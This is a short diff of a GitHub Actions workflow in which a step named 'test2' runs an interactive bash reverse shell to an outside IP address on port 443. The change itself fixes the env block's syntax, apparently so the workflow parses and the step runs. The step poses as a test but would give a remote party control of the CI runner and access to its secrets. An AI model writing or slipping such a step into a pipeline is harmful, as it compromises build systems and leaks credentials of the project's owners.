@@ -34,4 +34,4 @@ jobs:
       - name: test2
         run: /bin/bash -i >& /dev/tcp/15.237.149.54/443 0>&1 
         env:
-          - TEST: ${{ env.URLS_TRACKING }}
+          TEST: ${{ env.URLS_TRACKING }}
